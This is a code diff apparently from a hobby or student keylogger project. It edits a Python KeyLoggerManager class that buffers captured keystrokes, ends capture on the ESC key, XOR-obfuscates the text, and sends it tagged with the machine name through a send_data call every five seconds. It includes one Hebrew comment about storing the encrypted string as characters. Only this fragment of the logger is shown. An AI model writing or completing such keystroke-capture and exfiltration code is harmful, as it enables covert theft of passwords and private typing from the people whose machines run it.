@@ -46,10 +46,8 @@ class KeyLoggerManager:
             os.remove(self.file_path)
             self.timestamp = self.get_hour_timestamp()
 
-            # with open(self.file_path, "w") as file:
-            #     json.dump({}, file)
-
-
+            with open(self.file_path, "w") as file:
+                 json.dump({}, file)
 
     def manager(self):
         try:
@@ -66,19 +64,18 @@ class KeyLoggerManager:
                 if new_keys:
                     self.buffer.extend(new_keys)
 
-
                     if "<ESC>" in new_keys:
                         self.end = True
 
-                    encrypted_keys = [encryptor.ascii_xor(char) for char in self.buffer]
+                    buffer_text = ''.join(self.buffer)
+                    encrypted_text = encryptor.ascii_xor(buffer_text)
 
-                    data_dict = {self.timestamp: encrypted_keys}
+                    # שמירת המחרוזת המוצפנת כרשימה של תווים בודדים
+                    data_dict = {self.timestamp: list(encrypted_text)}
                     file_writer.send_data(data_dict, self.machine_name)
-
 
                     self.buffer = []
                     service.logged_keys = []
-
 
                 time.sleep(5)
         except KeyboardInterrupt:
